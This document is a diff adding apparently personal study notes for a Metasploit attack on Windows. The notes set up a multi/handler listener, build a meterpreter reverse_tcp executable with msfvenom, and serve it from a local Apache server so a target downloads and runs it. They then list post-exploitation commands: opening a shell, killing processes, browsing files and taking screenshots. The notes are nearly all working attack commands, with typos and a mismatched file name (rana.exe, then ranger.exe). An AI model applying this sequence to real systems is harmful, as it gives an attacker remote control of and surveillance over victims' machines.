@@ -1,0 +1,30 @@
+msfconsole (to Run metasploit)
+msf6> search multi/handler
+msf6> use exploit/multi/handler (Execute the modules)
+msf6>show options (for checking the all options)
+msf6>ifconfig (check local host ip)
+msf6>set LHOST <local host ip>
+msf6>set payload windows/meterpreter/reverse_tcp
+msf6>exploit (run the exploit)
+*********(Get Pesence and wait for the exploition)*****************
+<<<Open another Therminal>>>>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.36.133 LPORT=4444 -f exe -o rana.exe (-f for file type, -o for output, and this for making a exe file, and oviously set where you put that file)
+cp ranger.exe /ar/www/html (copy that file in html folder)
+service apache2 start (start the apache server)
+service apache2 status (check the apache server status)
+
+Now go to target sustem and brows the link as exaple 192.168.36.133/rana.exe
+after duble click on ranger.exe file , the LHOST machine getting that all information about target machine.
+meterpreter> getuid (getting the user target id)
+meterpreter>ps (show the running process and onthers)
+meterpreter> kill <Process id>
+meterpreter> shell (go to inside the windows)
+
+C:\user\rana\Downloads>dir (showing how and what types of file in there)
+cd.. (going Back to path)
+C:\user\rana (showing all the Directory)
+
+meterpreter> background (taking the current session in background and doing other operation)
+msf6 exploit(multi/handler)> sessions (showing the running sessions)
+msf6 exploit(multi/handler)> sessions -i 1 (insert the session again)
+meterpreter> screenshot (to get the target machine screenshort)
